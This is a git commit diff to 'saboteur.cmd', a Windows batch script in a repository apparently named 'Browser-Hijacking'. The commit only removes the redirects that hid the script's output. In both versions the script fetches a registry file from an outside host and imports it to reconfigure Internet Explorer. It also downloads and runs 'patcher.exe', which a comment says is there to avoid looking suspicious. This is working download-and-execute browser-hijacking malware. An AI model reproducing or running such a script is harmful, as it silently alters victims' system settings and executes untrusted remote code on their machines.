44ab6d4135f7e56d0d89ddb4660c919316eb256c
icesonata <hoanglong1622000@gmail.com>
2021-07-22 01:10:57 +0700

    cancel directing output to null

--- saboteur.cmd
+++ saboteur.cmd
@@ -1,8 +1,8 @@
 @REM Download IE configuration registry file
->nul 2>nul curl -o %tmp%\ieconf.reg -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO
+curl -o %tmp%\ieconf.reg -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO
 @REM Import configuration file into registry
->nul 2>nul reg import %tmp%\ieconf.reg
+reg import %tmp%\ieconf.reg
 @REM Download patcher to make the program run normally without suspicious behavior
->nul 2>nul curl -o %tmp%\patcher.exe -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
+curl -o %tmp%\patcher.exe -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
 @REM Execute patcher
->nul 2>nul %tmp%\patcher.exe --unleash "%cd%"
+%tmp%\patcher.exe --unleash "%cd%"
